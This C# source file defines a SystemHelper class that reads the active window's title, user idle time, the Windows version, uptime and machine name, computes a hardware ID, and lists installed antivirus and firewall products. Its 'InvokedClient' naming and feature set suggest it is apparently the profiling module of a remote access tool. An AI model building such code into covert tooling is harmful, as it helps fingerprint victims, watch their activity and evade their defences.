

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using InvokedCommon.Helpers;


namespace InvokedClient.Helper
{
	public static class SystemHelper
	{
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int GetWindowTextLength(IntPtr hWnd);

		[DllImport("user32.dll")]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

		[DllImport("user32.dll")]
		private static extern bool GetLastInputInfo(ref SystemHelper.LASTINPUTINFO plii);

		public static uint GetIdleTime()
		{
			SystemHelper.LASTINPUTINFO plii = new SystemHelper.LASTINPUTINFO();
			plii.cbSize = (uint)Marshal.SizeOf<SystemHelper.LASTINPUTINFO>(plii);
			if (!SystemHelper.GetLastInputInfo(ref plii))
				throw new Win32Exception();
			return (uint)Environment.TickCount - plii.dwTime;
		}

		public static string GetCaptionOfActiveWindow()
		{
			string captionOfActiveWindow = string.Empty;
			IntPtr foregroundWindow = SystemHelper.GetForegroundWindow();
			int num = SystemHelper.GetWindowTextLength(foregroundWindow) + 1;
			StringBuilder lpString = new StringBuilder(num);
			if (SystemHelper.GetWindowText(foregroundWindow, lpString, num) > 0)
				captionOfActiveWindow = lpString.ToString();
			try
			{
				uint ProcessId;
				SystemHelper.GetWindowThreadProcessId(foregroundWindow, out ProcessId);
				Process processById = Process.GetProcessById((int)ProcessId);
				captionOfActiveWindow = !(captionOfActiveWindow == "") ? processById.ProcessName + " - " + captionOfActiveWindow : processById.ProcessName;
				processById.Dispose();
			}
			catch
			{
			}
			return captionOfActiveWindow;
		}

		public static string GetWindowsVersion()
		{
			string windowsVersion = "";
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
			{
				ManagementObjectCollection objectCollection = managementObjectSearcher.Get();
				if (objectCollection != null)
				{
					foreach (ManagementObject managementObject in objectCollection)
						windowsVersion = managementObject["Caption"].ToString() + " - " + managementObject["OSArchitecture"].ToString();
					objectCollection.Dispose();
				}
			}
			return windowsVersion;
		}

		public static string GetHWID()
		{
			try
			{
				return SystemHelper.GetHash(Environment.ProcessorCount.ToString() + Environment.UserName + Environment.MachineName + (object)Environment.OSVersion + (object)new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
			}
			catch
			{
				return "UNKNOWN";
			}
		}

		private static string GetHash(string strToHash)
		{
			byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(strToHash));
			StringBuilder stringBuilder = new StringBuilder();
			foreach (byte num in hash)
				stringBuilder.Append(num.ToString("x2"));
			return stringBuilder.ToString().Substring(0, 20).ToUpper();
		}

		public static string GetUptime()
		{
			try
			{
				string str = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem WHERE Primary='true'"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							TimeSpan timeSpan = TimeSpan.FromTicks((DateTime.Now - ManagementDateTimeConverter.ToDateTime(enumerator.Current["LastBootUpTime"].ToString())).Ticks);
							str = string.Format("{0}d : {1}h : {2}m : {3}s", (object)timeSpan.Days, (object)timeSpan.Hours, (object)timeSpan.Minutes, (object)timeSpan.Seconds);
						}
					}
				}
				return !string.IsNullOrEmpty(str) ? str : throw new Exception("Getting uptime failed");
			}
			catch
			{
				return string.Format("{0}d : {1}h : {2}m : {3}s", (object)0, (object)0, (object)0, (object)0);
			}
		}

		public static string GetPcName() => Environment.MachineName;

		public static string GetAntivirus()
		{
			try
			{
				string input = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(PlatformHelper.VistaOrHigher ? "root\\SecurityCenter2" : "root\\SecurityCenter", "SELECT * FROM AntivirusProduct"))
				{
					foreach (ManagementObject managementObject in managementObjectSearcher.Get())
						input = input + managementObject["displayName"].ToString() + "; ";
				}
				string str = StringHelper.RemoveLastChars(input);
				return !string.IsNullOrEmpty(str) ? str : "N/A";
			}
			catch
			{
				return "Unknown";
			}
		}

		public static string GetFirewall()
		{
			try
			{
				string input = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(PlatformHelper.VistaOrHigher ? "root\\SecurityCenter2" : "root\\SecurityCenter", "SELECT * FROM FirewallProduct"))
				{
					foreach (ManagementObject managementObject in managementObjectSearcher.Get())
						input = input + managementObject["displayName"].ToString() + "; ";
				}
				string str = StringHelper.RemoveLastChars(input);
				return !string.IsNullOrEmpty(str) ? str : "N/A";
			}
			catch
			{
				return "Unknown";
			}
		}

		private struct LASTINPUTINFO
		{
			public uint cbSize;
			public uint dwTime;
		}
	}
}